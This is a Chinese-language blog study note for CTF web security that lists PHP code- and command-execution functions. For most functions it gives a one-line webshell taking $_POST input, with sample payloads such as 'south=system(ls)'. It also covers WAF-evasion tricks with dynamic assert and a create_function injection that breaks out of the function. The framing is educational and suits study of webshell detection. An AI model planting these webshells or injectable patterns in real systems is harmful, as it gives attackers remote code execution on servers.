  <entry>
    <title>Web安全执行函数修炼计划</title>
    <url>/Study-Execution-Function/</url>
    <content><![CDATA[<p>本周任务，学习木马的执行函数。</p>
<p>根据查找到的资料，执行函数分为两类，代码执行函数和命令执行函数。</p>
<a id="more"></a>

<p>短路与<strong>&amp;&amp;</strong>，前者为真，才执行后边；前边为假，都不执行。</p>
<p>逻辑与<strong>&amp;</strong>，无论前边真假，都执行。</p>
<p>短路或<strong>||</strong>，前者为真，后者不执行；前者为假，后者执行。</p>
<p>逻辑或<strong>|</strong>，无论前边真假，都执行。</p>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p><strong>eval ( string $code ) : mixed</strong>，该函数是将传入的字符串当做<strong>PHP</strong>代码执行，必须以分号结尾，不支持动态调用。</p>
<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'south';"</span>);</span><br><span class="line"><span class="comment"># south</span></span><br></pre></td></tr></table></figure>

<p>以上是正常使用，下面是作为一句话木马的使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>

<h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p><strong>assert ( mixed $assertion [, Throwable $exception ] ) : bool</strong>，第一个参数是将传入的字符串当做<strong>PHP</strong>代码执行，是用来判断表达式是否成立的，不需分号结尾，第二个参数可选，作为失败判断的回调信息打印。</p>
<p><strong>assert_option()</strong>可以用来对<strong>assert()</strong>进行一些约束和控制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASSERT_ACTIVE&#x3D;1 &#x2F;&#x2F; Assert函数的开关。</span><br><span class="line">ASSERT_WARNING &#x3D;1 &#x2F;&#x2F; 当表达式为false时，是否要输出警告性的错误提示。</span><br><span class="line">ASSERT_BAIL&#x3D; 0 &#x2F;&#x2F; 是否要中止运行。</span><br><span class="line">ASSERT_QUIET_EVAL&#x3D; 0 &#x2F;&#x2F; 在执行表达式时是否关闭错误提示。</span><br><span class="line">ASSERT_CALLBACK&#x3D; (NULL) &#x2F;&#x2F; 是否启动回调函数 user function to call on failed assertions</span><br></pre></td></tr></table></figure>

<h5 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(<span class="string">'1==1'</span>);</span><br><span class="line"><span class="comment"># bool(true)</span></span><br></pre></td></tr></table></figure>

<p>以上是正常使用，下面是作为一句话木马的使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>

<h5 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h5><p>在<strong>PHP7.1</strong>以下，<strong>assert()</strong>函数可以被动态调用，是大多数过狗一句话的原理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_POST[<span class="string">'south'</span>]($_POST[<span class="string">'sea'</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><p><strong>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] ) : mixed</strong>，第一个参数是回调函数的函数名，后面皆是回调函数的参数。</p>
<p><strong>is_callable()</strong>函数可以检测是否为回调函数。</p>
<h5 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> call_user_func(<span class="string">'assert'</span>,$_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>

<h4 id="call-user-fuc-array"><a href="#call-user-fuc-array" class="headerlink" title="call_user_fuc_array"></a>call_user_fuc_array</h4><p><strong>call_user_func_array ( callable $callback , array $param_arr ) : mixed</strong>，同上，不过第二个参数传入的是数组。</p>
<h5 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command[<span class="number">0</span>] = $_POST[<span class="string">'south'</span>];</span><br><span class="line">call_user_func_array(<span class="string">"assert"</span>, $command);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>

<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p><strong>create_function ( string $args , string $code ) : string</strong>，创建一个匿名函数，第一个参数是匿名函数传入的参数名，第二个参数是匿名函数的代码。</p>
<h5 id="举例-4"><a href="#举例-4" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sea = create_function(<span class="string">'$command'</span>, <span class="string">'eval($command);'</span>);</span><br><span class="line">$sea($_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>

<h5 id="拓展-1"><a href="#拓展-1" class="headerlink" title="拓展"></a>拓展</h5><p>题目如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_POST[<span class="string">'command'</span>];</span><br><span class="line">$south = <span class="string">'echo s'</span> . $command . <span class="string">';'</span>;</span><br><span class="line">$sea = create_function(<span class="string">''</span>, $south);</span><br><span class="line"><span class="comment"># command=;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p>正常情况下创建的函数如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'s'</span> . $command;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造恶意代码提前闭合函数，构造好的函数如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sea</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'s'</span>;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>因此得以执行。</p>
<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p><strong>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</strong>，该函数为在<strong>$subject</strong>参数中匹配<strong>$pattern</strong>参数替换为<strong>$replacement</strong>，而其<strong>$pattern</strong>参数存在的<strong>/e</strong>修饰符会使得<strong>$replacement</strong>参数被当做<strong>PHP</strong>代码解析。</p>
<h5 id="举例-5"><a href="#举例-5" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> preg_replace(<span class="string">"/sea/e"</span>, $_POST[<span class="string">'south'</span>], <span class="string">"sea"</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>

<h5 id="拓展-2"><a href="#拓展-2" class="headerlink" title="拓展"></a>拓展</h5><p>在<strong>PHP7</strong>中被修正。</p>
<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p><strong>array_map ( callable $callback , array $array1 [, array $… ] ) : array</strong>，类似于<strong>call_user_func</strong>，但后面传入的<strong>$array1</strong>是多组参数，而返回的是多组参数的执行结果。</p>
<h5 id="举例-6"><a href="#举例-6" class="headerlink" title="举例"></a>举例</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$south = $_POST[<span class="string">'south'</span>];</span><br><span class="line">$sea = $_POST[<span class="string">'sea'</span>];</span><br><span class="line">array_map($south, $sea);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p><strong>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</strong>，同上相似，但是需要注意的是第一个参数是回调函数的参数，第二个参数才是回调函数的函数名，且返回的结果是当回调函数返回<strong>true</strong>时的第一个参数的值的数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$south = $_POST[<span class="string">'south'</span>];</span><br><span class="line">$sea = $_POST[<span class="string">'sea'</span>];</span><br><span class="line">array_filter($sea, $south);</span><br><span class="line"><span class="comment"># south=system&amp;sea[0]=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h4><p><strong>usort ( array &amp;$array , callable $value_compare_func ) : bool</strong>，该函数的原本作用是使用用户自定义的比较函数对数组中的值进行排序，在<strong>PHP5.6</strong>下开始支持变长参数，因此在<strong>Shell</strong>的构造中可以这样。且只有数字索引数组才能作为变长参数数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> usort(...$_POST);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>

<h4 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h4><p>同上，不同之处是不会打乱原数组的顺序。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> uasort(...$_POST);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p><strong>system ( string $command [, int &amp;$return_var ] ) : string</strong>，有回显，有返回值，<strong>$return_var</strong>为状态码，执行成功为<strong>0</strong>，反之为<strong>1</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p><strong>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</strong>，无回显，有返回值，需手动获取，<strong>$output</strong>为执行结果，<strong>$return_var</strong>同上。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">exec($_POST[<span class="string">'south'</span>], $output, $return_var);</span><br><span class="line">var_dump($output);</span><br><span class="line">var_dump($return_var);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p><strong>passthru ( string $command [, int &amp;$return_var ] ) : void</strong>，有回显，无返回值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> passthru($_POST[<span class="string">'south'</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p><strong>shell_exec ( string $cmd ) : string</strong>，无回显，有返回值，需手动获取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$res = shell_exec($_POST[<span class="string">'south'</span>]);</span><br><span class="line">var_dump($res);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>

<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>无回显，有返回值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$south = $_POST[<span class="string">'south'</span>];</span><br><span class="line"><span class="keyword">echo</span> `$south`;</span><br></pre></td></tr></table></figure>

<h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><p><strong>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) : bool</strong>，<strong>$output_callback</strong>是在<strong>ob_flush()</strong>，<strong>ob_clean()</strong>时候才被调用的回调函数，若非调用函数则返回<strong>FALSE</strong>。<strong>$chunk_size</strong>为缓冲区大小，超出即刷新，<strong>0</strong>则最后调用，最大<strong>4096</strong>，<strong>$erase</strong>为<strong>FALSE</strong>的时候需要等脚本全部执行完毕才能刷新缓冲区，否则会抛出一个<strong>notice</strong>,并返回<strong>FALSE</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start(<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> $_POST[<span class="string">'south'</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Web安全修炼计划</tag>
      </tags>
